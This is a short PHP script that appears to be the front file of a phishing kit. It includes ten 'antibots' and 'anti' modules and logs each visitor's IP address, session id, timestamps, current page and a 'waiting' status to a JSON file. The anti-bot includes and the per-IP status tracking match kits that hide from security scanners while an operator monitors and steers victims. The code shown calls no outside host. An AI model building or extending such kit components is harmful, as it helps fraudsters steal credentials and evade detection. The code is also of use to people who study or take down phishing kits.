<?php
session_start();
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';

$ip = $_SERVER['REMOTE_ADDR'];
$vid = isset($_SESSION['vid']) ? $_SESSION['vid'] : uniqid('vid_');
$_SESSION['vid'] = $vid;

$filepath = 'active_users.json';
$users = file_exists($filepath) ? json_decode(file_get_contents($filepath), true) : [];

$currentPage = basename($_SERVER['PHP_SELF']);

$users[$ip] = [
    'vid' => $vid,
    'first_seen' => $users[$ip]['first_seen'] ?? time(),
    'last_seen' => time(),
    'last_page' => $currentPage,
    'status' => 'waiting'
];

file_put_contents($filepath, json_encode($users, JSON_PRETTY_PRINT));


?>
